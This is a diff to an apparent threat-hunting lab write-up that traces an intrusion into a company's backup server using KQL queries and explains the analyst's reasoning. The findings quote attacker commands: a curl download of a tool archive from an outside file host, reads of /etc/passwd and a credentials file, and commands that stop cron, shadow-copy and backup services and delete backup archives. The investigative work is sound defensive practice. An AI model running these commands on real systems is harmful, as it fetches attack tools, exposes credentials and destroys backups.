@@ -40,6 +40,7 @@ On November 19, 2025, at 18:36UTC, Azuki Import/Export Trading Co. was compromis
 
 - **Affected Systems:** azuki-sl, azuki-adminPC, azuki-FS01, azuki-BackupSrv
 - **Comprimised Account:** backup-admin
+- **Operating Systems:** Windows 11, Linux Ubuntu 22.04
 - **Investigation Tool:** Azure Log Analytics Workspace
   
 ## 🧬 MITRE ATT&CK Mapping (Attack Chain)
@@ -67,7 +68,7 @@ On November 19, 2025, at 18:36UTC, Azuki Import/Export Trading Co. was compromis
 
 **Finding**: `ssh.exe backup-admin@10.1.0.189` was used on `azuki-adminpc` to remote into `Azuki-backupsrv` at `2025-11-25T05:39:10.889728Z`
 
-**Thoughts**: 
+**Thoughts**: Because I knew the Backup Server was a Linux machine, I wanted to search for SSH connections. I decided to query for commands ran from any machine in the network that included the IP address of the server.
 
 **KQL Query**:
 ```
@@ -84,7 +85,7 @@ DeviceProcessEvents
 
 **Finding**: the attacker used the `ls --color=auto -la /backups/` command followed by `find /backups -name *.tar.gz` at `2025-11-25T05:47:51.749736Z` 
 
-**Notes**:  
+**Thoughts**:  The `ls` command in Linux is used to list the contents of a directory. I first wanted to see if and where it was used. The `find` command in Linux is used to search for files in a directory. I combined it with the string `backups` to see if the attacker tried to find files in a backups directory.
 
 **KQL Queries**:
 ```
@@ -106,7 +107,7 @@ DeviceProcessEvents
 
 **Finding**:  `cat /etc/passwd` at `2025-11-24T14:16:08.673485Z`
 
-**Thoughts**: 
+**Thoughts**: Looking at the Mitre technique T1087.001 "Account Discovery", I found that `/etc/passwd` can be used to enumerate through local users.
 
 **KQL Query**:
 ```
@@ -123,7 +124,7 @@ DeviceProcessEvents
 
 **Finding**: `cat /etc/crontab` at `2025-11-24T14:16:08.703052Z`
 
-**Thoughts**:
+**Thoughts**: While researching, I discovered that `crontab` is the Linux utility that schedules tasks.
 
 **KQL Query**:
 ```
@@ -137,7 +138,9 @@ DeviceProcessEvents
 
 ## :triangular_flag_on_post: Flag 8 – What command downloaded external tools?
 
-**Finding**: `curl -L -o destroy.7z https[:]//litter[.]catbox[.]moe/io523y[.]7z` at `2025-11-25T05:45:34.259149Z`
+**Finding**: `curl -L -o destroy.7z https[:]//litter[.]catbox[.]moe/io523y[.]7z` at `2025-11-25T05:45:34.259149Z`  
+
+**Thoughts**: the `Curl` command is the easiest method to download contents from a website via CMD
 
 **KQL Query**:
 ```
@@ -153,9 +156,9 @@ DeviceProcessEvents
 
 ## :triangular_flag_on_post: Flag 9 – What command accessed stored credentials?
 
-**Finding**: `cat /backups/configs/all-credentials.txt` at `2025-11-24T14:14:14.217788Z`
+**Finding**: `cat /backups/configs/all-credentials.txt` at `2025-11-24T14:14:14.217788Z`  
 
-**REG Path**: 
+**Thoughts**: text files are the most common unsecured credential files. I first wanted to search for any commands that were used to access a text file.
 
 **KQL Query**:
 ```
@@ -168,8 +171,9 @@ DeviceProcessEvents
 ---
 ## :triangular_flag_on_post: Flag 10 - 12 – How did the attacker disable backup services and destroy backup files?
 
-**Finding**: The attacker ran `systemctl stop cron`, `systemctl disable cron`, and  `rm -rf /backups/archives` starting at `2025-11-25T05:47:02.660493Z `
+**Finding**: The attacker ran `systemctl stop cron`, `systemctl disable cron`, and  `rm -rf /backups/archives` starting at `2025-11-25T05:47:02.660493Z `  
 
+**Thoughts**: The `systemctl` command is used to manage system services. I paired it with `stop` and `disable` to query for commands ran with all 3. The `rm` command is used to delete files. I used it in combination with `backups` to check if any files had been deleted in the backups directory.
 
 **KQL Query**:
 ```
@@ -214,14 +218,14 @@ DeviceProcessEvents
 
 **Finding**:  `Silentlynx.exe`
 
-**Notes**: This was discovered when running the previous query for flags 13 & 14. 
+**Note**: This was discovered when running the previous query for flags 13 & 14. 
 
 ---
 ## :triangular_flag_on_post: Flag 16 & 17 – How did the attacker stop the shadow copy service and the backup engine?
 
 **Finding**:  The attacker ran  `"net" stop VSS /y` and `"net" stop wbengine /y` at `2025-11-25T06:04:53.4247108Z`
 
-**Thoughts**:
+**Thoughts**: After researching, I found the `.exe` for the `Volume Shadow Copy Service` and the `Backup Engine Service`. I then queried for any commands that included the .exe as well as "stop".
 
 
 **KQL Query**:
